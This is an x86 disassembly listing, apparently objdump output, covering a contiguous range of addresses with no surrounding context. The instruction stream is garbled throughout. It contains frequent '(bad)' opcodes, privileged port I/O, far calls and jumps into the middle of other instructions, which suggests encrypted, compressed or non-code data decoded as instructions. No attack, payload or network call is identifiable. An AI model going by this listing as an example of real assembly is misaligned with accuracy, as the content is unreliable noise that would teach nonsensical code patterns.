  6a54b1:	inc    eax
  6a54b2:	sub    esp,DWORD PTR [ebx]
  6a54b4:	mov    ds:0x7b5e72c6,eax
  6a54b9:	sahf   
  6a54ba:	fimul  DWORD PTR [ebp+0x240f042a]
  6a54c0:	bound  eax,QWORD PTR [ebx]
  6a54c2:	adc    al,0xfd
  6a54c4:	add    BYTE PTR [ebp+0x38eee495],0xed
  6a54cb:	pushf  
  6a54cc:	test   BYTE PTR [eax+0x56],cl
  6a54cf:	jno    0x6a5475
  6a54d1:	(bad)  
  6a54d2:	popa   
  6a54d3:	inc    esp
  6a54d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a54d5:	jbe    0x6a5524
  6a54d7:	and    al,0xf9
  6a54d9:	push   edi
  6a54da:	mov    ds:0xa6b41cf,al
  6a54df:	aad    0x98
  6a54e1:	jmp    DWORD PTR [ebx-0x64b6ef64]
  6a54e7:	daa    
  6a54e8:	repnz cmp dh,BYTE PTR [ebx+0x32df965]
  6a54ef:	pop    ss
  6a54f0:	inc    ebx
  6a54f1:	adc    ecx,ebx
  6a54f3:	xchg   ebx,eax
  6a54f4:	xchg   esi,ebp
  6a54f6:	mov    ah,0xd
  6a54f8:	pop    ds
  6a54f9:	jmp    0x6a549b
  6a54fb:	sub    ebx,0x5b
  6a54fe:	lock pslld mm4,mm4
  6a5502:	sbb    BYTE PTR [esi+0x75],dl
  6a5505:	dec    esi
  6a5506:	mov    eax,ds:0x7e9813f2
  6a550b:	fsubr  QWORD PTR ds:0xd348a767
  6a5511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a5512:	(bad)  
  6a5513:	and    DWORD PTR [ecx],esp
  6a5515:	scas   al,BYTE PTR es:[edi]
  6a5516:	xchg   edx,eax
  6a5517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a5518:	ds fwait
  6a551a:	mov    eax,ds:0xc336fce5
  6a551f:	(bad)  
  6a5520:	sub    ebx,ecx
  6a5522:	enter  0xc07b,0x5f
  6a5526:	(bad)  
  6a5527:	jno    0x6a552a
  6a5529:	push   ecx
  6a552a:	dec    ecx
  6a552b:	cwde   
  6a552c:	pop    eax
  6a552d:	lods   al,BYTE PTR ds:[esi]
  6a552e:	shl    DWORD PTR [edi+0x56],cl
  6a5531:	(bad)  
  6a5532:	cmp    dl,BYTE PTR [esi-0x50ac94cf]
  6a5538:	mul    DWORD PTR [edx-0x4e]
  6a553b:	(bad)  
  6a553c:	jp     0x6a54cc
  6a553e:	gs sub dh,ah
  6a5541:	dec    ebx
  6a5542:	imul   esi,DWORD PTR [ebp+0x31d61575],0x12
  6a5549:	jp     0x6a556d
  6a554b:	out    0xf9,al
  6a554d:	popa   
  6a554e:	(bad)  
  6a554f:	cld    
  6a5550:	push   es
  6a5551:	adc    DWORD PTR [ebx+0x36],ecx
  6a5554:	cwde   
  6a5555:	call   0xeff5:0x94b942e2
  6a555c:	adc    ecx,0xcce69bc
  6a5562:	add    BYTE PTR [ecx],bl
  6a5564:	jne    0x6a54ed
  6a5566:	(bad)  [eax]
  6a5568:	js     0x6a5502
  6a556a:	stos   DWORD PTR es:[edi],eax
  6a556b:	dec    esp
  6a556c:	movq   QWORD PTR ds:0x11b52400,mm2
  6a5573:	pop    ds
  6a5574:	js     0x6a54ff
  6a5576:	inc    ebx
  6a5577:	in     al,0x1b
  6a5579:	jno    0x6a5590
  6a557b:	and    BYTE PTR [eax+0x4108a23d],ch
  6a5581:	sahf   
  6a5582:	dec    esp
  6a5583:	test   al,0xde
  6a5585:	scas   eax,DWORD PTR es:[edi]
  6a5586:	sbb    al,BYTE PTR [ebx-0x1120b0a4]
  6a558c:	pop    ebp
  6a558d:	(bad)  
  6a558e:	jnp    0x6a559a
  6a5590:	leave  
  6a5591:	inc    esp
  6a5592:	adc    ecx,DWORD PTR [esi+0x7a]
  6a5595:	stc    
  6a5596:	adc    dh,BYTE PTR [esi]
  6a5598:	ds aaa 
  6a559a:	mov    WORD PTR [eax],?
  6a559c:	lods   al,BYTE PTR ds:[esi]
  6a559d:	cmp    al,dh
  6a559f:	lods   al,BYTE PTR ds:[esi]
  6a55a0:	mov    edi,0x8ac9676a
  6a55a5:	(bad)  
  6a55a6:	in     eax,0x23
  6a55a8:	int    0x9b
  6a55aa:	push   es
  6a55ab:	and    BYTE PTR [eax],bh
  6a55ad:	test   eax,0x5f293361
  6a55b2:	mov    ebp,0xa3ca9083
  6a55b7:	xchg   DWORD PTR [ebp+0x474c5369],eax
  6a55bd:	lds    edi,FWORD PTR ds:[edx]
  6a55c0:	inc    ecx
  6a55c1:	test   bh,0x84
  6a55c4:	or     bl,BYTE PTR [edi+0x52b20661]
  6a55ca:	pop    edi
  6a55cb:	xchg   esp,eax
  6a55cc:	or     DWORD PTR [ebx+edx*4-0xaf99d69],0xa2e7951e
  6a55d7:	sbb    dl,BYTE PTR fs:[ecx]
  6a55da:	pop    ecx
  6a55db:	inc    edi
  6a55dc:	ret    
  6a55dd:	lds    eax,FWORD PTR [eax+0x70]
  6a55e0:	int    0xe0
  6a55e2:	xchg   DWORD PTR [eax+ecx*1+0x1c258563],ebx
  6a55e9:	icebp  
  6a55ea:	ins    DWORD PTR es:[edi],dx
  6a55eb:	mov    dl,0x3d
  6a55ed:	imul   DWORD PTR [esi+0x73]
  6a55f0:	shr    DWORD PTR [ebx+0x60],0x22
  6a55f4:	mov    ss,WORD PTR [esi-0x7fcf4666]
  6a55fa:	adc    BYTE PTR [ecx+ebp*2-0x6c],bl
  6a55fe:	leave  
  6a55ff:	popf   
  6a5600:	add    al,BYTE PTR [ebp+0x6a30a548]
  6a5606:	scas   eax,DWORD PTR es:[edi]
  6a5607:	pop    es
  6a5608:	lahf   
  6a5609:	fcmovu st,st(6)
  6a560b:	inc    ecx
  6a560c:	popf   
  6a560d:	sub    bl,al
  6a560f:	jns    0x6a55ee
  6a5611:	rol    dl,1
  6a5613:	mov    BYTE PTR [edx-0x6d],0x64
  6a5617:	and    eax,0xa01a6ee8
  6a561c:	mov    al,0xf8
  6a561e:	pop    eax
  6a561f:	adc    DWORD PTR [edx+0x29],edi
  6a5622:	pop    ds
  6a5623:	or     ebp,DWORD PTR [eax+edx*1]
  6a5626:	or     eax,0x53e59209
  6a562b:	fwait
  6a562c:	test   DWORD PTR [edi-0x3c],edx
  6a562f:	push   0xd6cb741b
  6a5634:	mov    ah,0x34
  6a5636:	pop    es
  6a5637:	lods   eax,DWORD PTR ds:[esi]
  6a5638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a5639:	mov    ecx,0xef16e6e5
  6a563e:	add    esi,DWORD PTR [ebx-0x6b]
  6a5641:	aas    
  6a5642:	lock push 0x526b5444
  6a5648:	pushf  
  6a5649:	xor    BYTE PTR [esi+0x78],0x37
  6a564d:	out    dx,eax
  6a564e:	and    eax,0xa327ed41
  6a5653:	mov    esp,0xf1cebfba
  6a5658:	es into 
  6a565a:	test   eax,0x559fb423
  6a565f:	(bad)  
  6a5660:	pushf  
  6a5661:	push   0xf
  6a5663:	mov    cl,0xe4
  6a5665:	add    eax,0x788ecf1d
  6a566a:	jno    0x6a565e
  6a566c:	cmp    dh,BYTE PTR [ebp+eiz*8+0x55]
  6a5670:	imul   BYTE PTR [esi]
  6a5672:	cwde   
  6a5673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a5674:	xchg   edx,eax
  6a5675:	pop    es
  6a5676:	outs   dx,BYTE PTR ds:[esi]
  6a5677:	aaa    
  6a5678:	enter  0x3369,0xf0
  6a567c:	retf   0x4135
  6a567f:	out    0x22,eax
  6a5681:	jmp    0x6a5637
  6a5683:	inc    edx
  6a5684:	mov    ah,0xf8
  6a5686:	bound  eax,QWORD PTR [ecx-0xbe5df2c]
  6a568c:	lock ja 0x6a5704
  6a568f:	adc    ch,ch
  6a5691:	xchg   edi,eax
  6a5692:	xor    DWORD PTR [edi+0x1],eax
  6a5695:	and    ah,al
  6a5697:	adc    DWORD PTR [ebp-0x4c6b8a6],edx
  6a569d:	ret    0xb481
  6a56a0:	mov    al,ds:0xa0449387
  6a56a5:	pop    ebp
  6a56a6:	add    BYTE PTR [ebp+ebx*4+0x52],bl
  6a56aa:	sahf   
  6a56ab:	ror    BYTE PTR [edx-0x2e],1
  6a56ae:	adc    dh,BYTE PTR [edx+0x61]
  6a56b1:	test   al,0xa8
  6a56b3:	mov    edi,0xf0569e71
  6a56b8:	pop    ecx
  6a56b9:	and    DWORD PTR [ecx+0x15638f1b],esi
  6a56bf:	(bad)  
  6a56c0:	pop    edx
  6a56c1:	and    al,0x56
  6a56c3:	cmp    dl,BYTE PTR [edi]
  6a56c5:	neg    DWORD PTR [ebx+0x7a]
  6a56c8:	mov    eax,ds:0xd286282d
  6a56cd:	fld    TBYTE PTR [esi]
  6a56cf:	cmp    edi,DWORD PTR [ecx-0x7f]
  6a56d2:	sar    DWORD PTR [ebp+0x42],1
  6a56d5:	test   al,0x2d
  6a56d7:	fdiv   DWORD PTR [esi-0x2b93afc7]
  6a56dd:	mov    ecx,0xeae9dfc2
  6a56e2:	pop    esp
  6a56e3:	push   ds
  6a56e4:	test   DWORD PTR [eax+0x52],0xcf1389c0
  6a56eb:	adc    BYTE PTR [edi+0x7d],bh
  6a56ee:	popf   
  6a56ef:	jg     0x6a5759
  6a56f1:	jle    0x6a56d8
  6a56f3:	jle    0x6a5682
  6a56f5:	pop    ebx
  6a56f6:	adc    al,0x6
  6a56f8:	jbe    0x6a56c1
  6a56fa:	neg    bl
  6a56fc:	or     BYTE PTR [edx+0x7a8bb823],dh
  6a5702:	data16 test BYTE PTR cs:[ebx-0x48],cl
  6a5707:	push   ebp
  6a5708:	xor    ebx,edx
  6a570a:	dec    edx
  6a570b:	imul   esp,ebx,0xb3f573f7
  6a5711:	aaa    
  6a5712:	sub    esi,DWORD PTR [eax-0x180e4b9e]
  6a5718:	loope  0x6a56b5
  6a571a:	in     al,dx
  6a571b:	mov    eax,ds:0x8f798e49
  6a5720:	sub    BYTE PTR [eax-0x12],ch
  6a5723:	sbb    eax,0x88b10859
  6a5728:	mov    al,ds:0x31632339
  6a572d:	repnz xchg edi,eax
  6a572f:	loop   0x6a56bd
  6a5731:	push   esi
  6a5732:	and    esi,DWORD PTR [edx]
  6a5734:	leave  
  6a5735:	adc    ch,BYTE PTR [edi+0x4d]
  6a5738:	pop    esp
  6a5739:	int3   
  6a573a:	call   0x2b1d1f60
  6a573f:	iret   
  6a5740:	pop    DWORD PTR [ecx+0x75]
  6a5743:	addr16 sahf 
  6a5745:	ins    DWORD PTR es:[edi],dx
  6a5746:	inc    ecx
  6a5747:	cmp    eax,0xfef2a1e9
  6a574c:	or     BYTE PTR [esi-0x38],0xa5
  6a5750:	fwait
  6a5751:	mov    eax,0x26d087c7
  6a5756:	xchg   DWORD PTR [ecx],esi
  6a5758:	mov    eax,ds:0x380bc8fc
  6a575d:	sub    bh,BYTE PTR [edx+0x799ea23a]
  6a5763:	in     eax,0x7b
  6a5765:	mov    esp,0x9ec6fd27
  6a576a:	pushf  
  6a576b:	mov    dh,0x5d
  6a576d:	pop    es
  6a576e:	(bad)  
  6a5770:	std    
  6a5771:	mov    ecx,0x4a6cb13
  6a5776:	das    
  6a5777:	out    dx,al
  6a5778:	adc    eax,0x935c743b
  6a577d:	das    
  6a577e:	sbb    DWORD PTR [ecx+0x1b],0x7f9c287
  6a5785:	pop    esi
  6a5786:	mov    eax,ds:0x950dbf65
  6a578b:	or     ebx,ebp
  6a578d:	jo     0x6a57de
  6a578f:	jle    0x6a571e
  6a5791:	popf   
  6a5792:	mov    eax,0x1bf215d3
  6a5797:	dec    edi
  6a5798:	pop    es
  6a5799:	fs push ebp
  6a579b:	jbe    0x6a580a
  6a579d:	nop
  6a579e:	repz mov edi,0x40a20cd
  6a57a4:	mov    edx,0x133ed
  6a57a9:	lods   eax,DWORD PTR ds:[esi]
  6a57aa:	push   esi
  6a57ab:	lods   eax,DWORD PTR ds:[esi]
  6a57ac:	sti    
  6a57ad:	inc    esi
  6a57ae:	dec    ebp
  6a57af:	out    dx,al
  6a57b0:	jmp    0x6a5816
  6a57b2:	pop    eax
  6a57b3:	and    ah,0x14
  6a57b6:	mov    eax,ds:0xd64f63af
  6a57bb:	cld    
  6a57bc:	inc    ebp
  6a57bd:	push   0x190129dc
  6a57c2:	cmp    DWORD PTR [edx],esi
  6a57c4:	arpl   cx,di
  6a57c6:	or     esp,edi
  6a57c8:	pushf  
  6a57c9:	cmp    BYTE PTR [edi+ebp*4],ah
  6a57cc:	loop   0x6a580e
  6a57ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a57cf:	mov    ch,0x3b
  6a57d1:	ss sti 
  6a57d3:	lods   eax,DWORD PTR ds:[esi]
  6a57d4:	sahf   
  6a57d5:	neg    DWORD PTR [esp+ebp*4-0x61]
  6a57d9:	add    BYTE PTR [esi+eax*8-0x2f],ch
  6a57dd:	inc    ebx
  6a57de:	arpl   WORD PTR [ecx-0x373c32b8],bp
  6a57e4:	test   DWORD PTR [ebx-0x626f2566],0x51274d24
  6a57ee:	fmul   st,st(1)
  6a57f0:	dec    esp
  6a57f1:	fwait
  6a57f2:	inc    edx
  6a57f3:	ins    BYTE PTR es:[edi],dx
  6a57f4:	mov    al,0x3c
  6a57f6:	outs   dx,DWORD PTR ds:[esi]
  6a57f7:	xchg   ebx,eax
  6a57f8:	jge    0x6a57a3
  6a57fa:	jns    0x6a57e8
  6a57fc:	mov    BYTE PTR [edi-0x5d200170],al
  6a5802:	mov    BYTE PTR [ebp-0x59],dl
  6a5805:	xchg   esp,eax
  6a5806:	mov    fs,WORD PTR [esi]
  6a5808:	scas   eax,DWORD PTR es:[edi]
  6a5809:	mov    ecx,0x53706597
  6a580e:	jo     0x6a5806
  6a5810:	and    dl,cl
  6a5812:	xlat   BYTE PTR ds:[ebx]
  6a5813:	je     0x6a581f
  6a5815:	adc    ch,BYTE PTR [ecx]
  6a5817:	ret    0xfd2c
  6a581a:	jle    0x6a5874
  6a581c:	gs jg  0x6a5850
  6a581f:	sub    BYTE PTR es:[ecx+0x7d],bl
  6a5823:	pop    eax
  6a5824:	cmp    cl,BYTE PTR [edx-0x55]
  6a5827:	push   ecx
  6a5828:	fdivp  st(2),st
  6a582a:	mov    edx,0xf467d5a7
  6a582f:	sbb    eax,0xf5012e7b
  6a5834:	leave  
  6a5835:	aas    
  6a5836:	pop    ecx
  6a5837:	inc    ecx
  6a5838:	addr16 mov edx,0x997e785d
  6a583e:	dec    ebp
  6a583f:	adc    ah,BYTE PTR [edx-0x1d7b5c49]
  6a5845:	int3   
  6a5846:	cmp    al,bh
  6a5848:	into   
  6a5849:	gs or  eax,0x14a1b5ea
  6a584f:	sbb    eax,0x6fba5023
  6a5854:	mov    ah,0xd8
  6a5856:	and    al,0xe
  6a5858:	sahf   
  6a5859:	test   DWORD PTR [edi+0x24ca7dfe],edi
  6a585f:	dec    ebp
  6a5860:	inc    ebx
  6a5861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a5862:	inc    ecx
  6a5863:	jne    0x6a58ae
  6a5865:	cmp    eax,0x310d209a
  6a586a:	and    edi,ebp
  6a586c:	inc    edx
  6a586d:	xchg   edx,eax
  6a586e:	or     eax,0x3ea2cf58
  6a5873:	adc    eax,0x5f9d9096
  6a5878:	sbb    ebp,DWORD PTR [ebp-0xb]
  6a587b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a587c:	fisttp WORD PTR [ecx]
  6a587e:	ja     0x6a5822
  6a5880:	push   ebp
  6a5881:	jmp    0x6a58f8
  6a5883:	push   ebp
  6a5884:	mov    WORD PTR [eax-0x37],cs
  6a5887:	sahf   
  6a5888:	(bad)  
  6a5889:	inc    BYTE PTR [esi]
  6a588b:	test   eax,0xdd896b47
  6a5890:	jmp    0x2046:0xa149273
  6a5897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a5898:	sbb    BYTE PTR [ebx-0x24],bl
  6a589b:	mov    DWORD PTR [ecx+esi*4],edi
  6a589e:	out    dx,al
  6a589f:	inc    esp
  6a58a0:	sbb    eax,0x55268e4
  6a58a5:	inc    esp
  6a58a6:	mov    edx,0x8ce154c5
  6a58ab:	or     eax,0xe0469241
  6a58b0:	sub    al,0x46
  6a58b2:	mov    edi,0x134e2a11
  6a58b7:	inc    edx
  6a58b8:	jge    0x6a5912
  6a58ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a58bb:	jge    0x6a5875
  6a58bd:	and    DWORD PTR [eax-0x333093b8],ecx
  6a58c3:	nop
  6a58c4:	mov    cs,WORD PTR [edx]
  6a58c6:	std    
  6a58c7:	nop
  6a58c8:	lea    edi,[edi-0xe6d7bd3]
  6a58ce:	ror    DWORD PTR [eiz*2+0x53b21dad],cl
  6a58d5:	in     al,0x23
  6a58d7:	pop    esp
  6a58d8:	adc    al,0x37
  6a58da:	gs repnz (bad) 
  6a58dd:	into   
  6a58de:	iret   
  6a58df:	and    ch,al
  6a58e1:	(bad)  
  6a58e2:	out    dx,al
  6a58e3:	jb     0x6a586c
  6a58e5:	lock stos DWORD PTR es:[edi],eax
  6a58e7:	jmp    0x6a5904
  6a58e9:	dec    eax
  6a58ea:	dec    esp
  6a58eb:	xor    ch,BYTE PTR gs:[edx]
  6a58ee:	add    BYTE PTR [edx+0x63],dh
  6a58f1:	pop    esi
  6a58f2:	ror    BYTE PTR [ebp+0x6286e20f],0xb
  6a58f9:	loopne 0x6a58d0
  6a58fb:	mov    al,0x79
  6a58fd:	sahf   
  6a58fe:	scas   eax,DWORD PTR es:[edi]
  6a58ff:	dec    eax
  6a5900:	sub    al,0x27
  6a5902:	and    ch,BYTE PTR [esi]
  6a5904:	mov    esi,0x50a41e28
  6a5909:	cmp    eax,DWORD PTR [ebp-0x54893ba3]
  6a590f:	cmc    
  6a5910:	ret    
  6a5911:	iret   
  6a5912:	scas   eax,DWORD PTR es:[edi]
  6a5913:	stos   DWORD PTR es:[edi],eax
  6a5914:	mov    ebx,0xef5686d5
  6a5919:	data16 scas al,BYTE PTR es:[edi]
  6a591b:	mov    ebx,0x5bb4603e
  6a5920:	sbb    bh,dl
  6a5922:	cmp    ch,0x3c
  6a5925:	lods   eax,DWORD PTR ds:[esi]
  6a5926:	rol    BYTE PTR [esi-0x211e2971],0x8
  6a592d:	push   ecx
  6a592e:	cmp    al,0x1d
  6a5930:	jle    0x6a5935
  6a5932:	or     BYTE PTR [ecx-0x6d],dh
  6a5935:	jg     0x6a58ee
  6a5937:	mov    BYTE PTR [edx],bh
  6a5939:	mov    esp,DWORD PTR [ebp-0x48]
  6a593c:	loop   0x6a5942
  6a593e:	jbe    0x6a5997
  6a5940:	in     al,dx
  6a5941:	jle    0x6a5992
  6a5943:	mov    ch,0xf5
  6a5945:	dec    ebx
  6a5946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a5947:	cmp    al,BYTE PTR [edi-0x70f9b96e]
  6a594d:	inc    ebp
  6a594e:	mov    ah,0x91
  6a5950:	sahf   
  6a5951:	jne    0x6a5918
  6a5953:	hlt    
  6a5954:	cmp    al,0xb
  6a5956:	mov    ah,0xca
  6a5958:	and    eax,0xd5290c18
  6a595d:	cmp    al,0xb8
  6a595f:	sbb    BYTE PTR [esi],ah
  6a5961:	push   0x8a63b0fb
  6a5966:	out    dx,al
  6a5967:	loop   0x6a59a4
  6a5969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a596a:	dec    ebx
  6a596b:	shr    BYTE PTR [ebx-0x2],0x20
  6a596f:	jns    0x6a59cd
  6a5971:	dec    edi
  6a5972:	pop    ss
  6a5973:	das    
  6a5974:	pop    ss
  6a5975:	or     eax,0x12f8b802
  6a597a:	add    dl,BYTE PTR [esp+edi*1-0x29c9b63f]
  6a5981:	stc    
  6a5982:	call   FWORD PTR [ecx-0x37]
  6a5985:	inc    DWORD PTR [ebp-0x50e06e38]
  6a598b:	push   ebp
  6a598c:	gs inc ecx
  6a598e:	adc    al,0xa5
  6a5990:	fild   DWORD PTR [eax]
  6a5992:	lea    ebx,[ebp-0x45440c43]
  6a5998:	scas   al,BYTE PTR es:[edi]
  6a5999:	xchg   ecx,eax
  6a599a:	lds    ecx,FWORD PTR [ecx+0xa2b628b]
  6a59a0:	mov    ch,0xd9
  6a59a2:	xor    BYTE PTR [ecx+0x2b],0x8f
  6a59a6:	push   ebx
  6a59a7:	push   edi
  6a59a8:	loop   0x6a5957
  6a59aa:	pop    es
  6a59ab:	sahf   
  6a59ac:	daa    
  6a59ad:	leave  
  6a59ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a59af:	pusha  
  6a59b0:	test   ebx,esi
  6a59b2:	adc    bl,dl
  6a59b4:	stos   BYTE PTR es:[edi],al
  6a59b5:	dec    esi
  6a59b6:	dec    eax
  6a59b7:	das    
  6a59b8:	cmp    al,BYTE PTR [ebx+0x49]
  6a59bb:	push   esp
  6a59bc:	pop    ecx
  6a59bd:	and    eax,DWORD PTR [ebx]
  6a59bf:	push   ebx
  6a59c0:	xchg   ecx,eax
  6a59c1:	test   cl,dl
  6a59c3:	push   edi
  6a59c4:	hlt    
  6a59c5:	fwait
  6a59c6:	jmp    0x6a59dc
  6a59c8:	enter  0xf073,0x94
  6a59cc:	push   DWORD PTR [edi+0x15]
  6a59cf:	mov    cl,0x3d
  6a59d1:	shr    DWORD PTR [ebp+0x365ee27c],0x46
  6a59d8:	cmp    edx,esp
  6a59da:	mov    ch,0xea
  6a59dc:	hlt    
  6a59dd:	mov    ds,WORD PTR [ebx-0x26]
  6a59e0:	add    al,0x59
  6a59e2:	mov    al,0x78
  6a59e4:	int    0xbc
  6a59e6:	push   ebp
  6a59e7:	xchg   ebp,eax
  6a59e8:	pop    ss
  6a59e9:	mov    eax,ds:0xb311bf89
  6a59ee:	aaa    
  6a59ef:	daa    
  6a59f0:	aas    
  6a59f1:	inc    eax
  6a59f2:	repz and al,0x71
  6a59f6:	push   esp
  6a59f7:	xor    edi,DWORD PTR [edi+0x4f18f9d2]
  6a59fd:	out    dx,eax
  6a59fe:	mov    ebx,0x4bab4485
  6a5a03:	and    ebx,DWORD PTR [eax-0x7cdc4915]
  6a5a09:	nop
  6a5a0a:	pushf  
  6a5a0b:	and    BYTE PTR [ebx],ch
  6a5a0d:	(bad)  
  6a5a0e:	shr    BYTE PTR [ebp+0x7a],cl
  6a5a11:	xor    DWORD PTR [ecx-0x58de34ad],edi
  6a5a17:	iret   
  6a5a18:	scas   al,BYTE PTR es:[edi]
  6a5a19:	mov    dl,0xe3
  6a5a1b:	pushf  
  6a5a1c:	cmp    eax,0x4d2774b5
  6a5a21:	popf   
  6a5a22:	sbb    DWORD PTR [ebx+0x73a1d597],0xbf2eccab
  6a5a2c:	cs mov ebp,0xd9bea641
  6a5a32:	xchg   ebp,eax
  6a5a33:	sti    
  6a5a34:	addr16 je 0x6a5a3a
  6a5a37:	(bad)  
  6a5a39:	adc    al,0x9e
  6a5a3b:	std    
  6a5a3c:	fadd   DWORD PTR [eax+0x4e]
  6a5a3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a5a40:	pusha  
  6a5a41:	sti    
  6a5a42:	cmp    BYTE PTR [edx-0x515aeb5f],dh
  6a5a48:	jmp    0x1c69:0x2bd5df7a
  6a5a4f:	in     eax,0x6f
  6a5a51:	clc    
  6a5a52:	pop    esp
  6a5a53:	mov    ebx,0x732209c1
  6a5a58:	fsubr  DWORD PTR [eax]
  6a5a5a:	add    DWORD PTR [ebx+esi*2-0x3b],esp
  6a5a5e:	lea    edi,[ecx-0x5d63db70]
  6a5a64:	mov    dl,0x7e
  6a5a66:	mov    al,0x5e
  6a5a68:	inc    ebp
  6a5a69:	sub    al,dh
  6a5a6b:	lods   eax,DWORD PTR ds:[esi]
  6a5a6c:	push   es
  6a5a6d:	mov    eax,0x9421eb86
  6a5a72:	(bad)  
  6a5a74:	add    eax,0x8fd7fefe
  6a5a79:	adc    al,0xad
  6a5a7b:	add    DWORD PTR [eax],esi
  6a5a7d:	xor    cl,bh
  6a5a7f:	xor    BYTE PTR [edi+0x14fcb653],bl
  6a5a85:	cmp    bl,BYTE PTR [edi+edi*8+0x74]
  6a5a89:	or     eax,0x9cc4fe29
  6a5a8e:	add    dl,BYTE PTR [ebp-0x36bde75c]
  6a5a94:	cmp    al,0xbd
  6a5a96:	push   ds
  6a5a97:	ret    0xf244
  6a5a9a:	push   edx
  6a5a9b:	addr16 rol ebx,1
  6a5a9e:	adc    eax,0xe0199e1d
  6a5aa3:	test   DWORD PTR [ebx],0x9b6e7995
  6a5aa9:	sbb    eax,0x8e917026
  6a5aae:	lds    esi,FWORD PTR ds:0x87c17498
  6a5ab4:	imul   edi,DWORD PTR [ecx+0x5a],0xffffffe5
  6a5ab8:	dec    eax
  6a5ab9:	sub    bh,al
  6a5abb:	jae    0x6a5aef
  6a5abd:	jmp    0x6a5ad4
  6a5abf:	aaa    
  6a5ac0:	jo     0x6a5aad
  6a5ac2:	fild   QWORD PTR [ebx+esi*4-0x5f]
  6a5ac6:	punpcklbw mm5,DWORD PTR [ebp-0x2d]
  6a5aca:	push   0x1c
  6a5acc:	adc    ch,ch
  6a5ace:	add    cl,al
  6a5ad0:	inc    ecx
  6a5ad1:	call   0x823d1fad
  6a5ad6:	mov    al,0x95
  6a5ad8:	lods   eax,DWORD PTR ds:[esi]
  6a5ad9:	xor    DWORD PTR [esi+0x46b767e6],esp
  6a5adf:	lahf   
  6a5ae0:	push   ebx
  6a5ae1:	mov    ds:0xbdb69ff,eax
  6a5ae6:	xor    BYTE PTR [esi-0x10],ah
  6a5ae9:	out    0x41,eax
  6a5aeb:	sar    DWORD PTR [esi-0x67],0x83
  6a5aef:	pop    eax
  6a5af0:	rcr    ah,0x9e
  6a5af3:	inc    edx
  6a5af4:	test   al,0x1d
  6a5af6:	xor    eax,0xa56c939b
  6a5afb:	and    DWORD PTR [ebx-0x74],0xc6bd40f9
  6a5b02:	nop
  6a5b03:	fldenv [edi+0x16f05e6f]
  6a5b09:	mul    DWORD PTR [esi+0x42]
  6a5b0c:	pop    ss
  6a5b0d:	jns    0x6a5a9d
  6a5b0f:	shr    DWORD PTR [edi+esi*2],0x3b
  6a5b13:	mov    BYTE PTR [ecx],cl
  6a5b15:	xor    ah,cl
  6a5b17:	les    eax,FWORD PTR [edx+0x6ac31273]
  6a5b1d:	lods   eax,DWORD PTR ds:[esi]
  6a5b1e:	xchg   DWORD PTR [eax+0x61fb965f],esp
  6a5b24:	aam    0xc6
  6a5b26:	daa    
  6a5b27:	mov    edi,0xbba78e8a
  6a5b2c:	outs   dx,DWORD PTR ds:[esi]
  6a5b2d:	ret    0xeef7
  6a5b30:	aas    
  6a5b31:	sbb    al,0x89
  6a5b33:	inc    esi
  6a5b34:	inc    eax
  6a5b35:	data16 cmp ch,BYTE PTR [ecx-0x8]
  6a5b39:	mov    esp,0xd8ab6a02
  6a5b3e:	and    al,0x56
  6a5b40:	xchg   ebp,eax
  6a5b41:	mov    ecx,0x536f6854
  6a5b46:	fdiv   st,st(6)
  6a5b48:	push   0xffffff82
  6a5b4a:	in     eax,dx
  6a5b4b:	imul   eax,esp,0xbe8a7f9d
  6a5b51:	enter  0xa70f,0x94
  6a5b55:	into   
  6a5b56:	dec    esp
  6a5b57:	inc    eax
  6a5b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a5b59:	push   0xfffffff6
  6a5b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a5b5c:	js     0x6a5bbc
  6a5b5e:	test   al,0x74
  6a5b60:	jecxz  0x6a5b5d
  6a5b62:	(bad)  
  6a5b63:	sbb    DWORD PTR [edx-0x600e8f2f],edi
  6a5b69:	neg    DWORD PTR ds:0xb46e6f8f
  6a5b6f:	push   es
  6a5b70:	fild   QWORD PTR [ecx-0x47]
  6a5b73:	cmp    ebp,0x54f07abd
  6a5b79:	push   esi
  6a5b7a:	gs jb  0x6a5b89
  6a5b7d:	retf   
  6a5b7e:	add    DWORD PTR [edi+ebp*2],esi
  6a5b81:	das    
  6a5b82:	push   ecx
  6a5b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a5b84:	or     al,0xe9
  6a5b86:	xchg   DWORD PTR [esi+0x662148a4],ebx
  6a5b8c:	sub    bl,ch
  6a5b8e:	sbb    eax,0x342b6651
  6a5b93:	aad    0x8d
  6a5b95:	dec    ecx
  6a5b96:	out    dx,al
  6a5b97:	sti    
  6a5b98:	hlt    
  6a5b99:	push   esi
  6a5b9a:	pushf  
  6a5b9b:	jo     0x6a5b5e
  6a5b9d:	push   ss
  6a5b9e:	enter  0xdc2b,0x7b
  6a5ba2:	icebp  
  6a5ba3:	outs   dx,BYTE PTR ds:[esi]
  6a5ba4:	ja     0x6a5bca
  6a5ba6:	jl     0x6a5b4e
  6a5ba8:	retf   0x1539
  6a5bab:	add    ebp,DWORD PTR [esi]
  6a5bad:	mov    eax,ds:0xdcd2d708
  6a5bb2:	mov    edi,0x23f93557
  6a5bb7:	aad    0xcd
  6a5bb9:	cwde   
  6a5bba:	dec    edx
  6a5bbb:	neg    BYTE PTR [eax-0x4f]
  6a5bbe:	adc    ah,BYTE PTR [edi+edx*4+0x6173b14b]
  6a5bc5:	mov    ecx,0x5ad1721f
  6a5bca:	lahf   
  6a5bcb:	and    DWORD PTR [esi],0x1de85a67
  6a5bd1:	push   ds
  6a5bd2:	dec    esp
  6a5bd3:	mov    ds:0xc9097ee9,al
  6a5bd8:	push   esi
  6a5bd9:	dec    esp
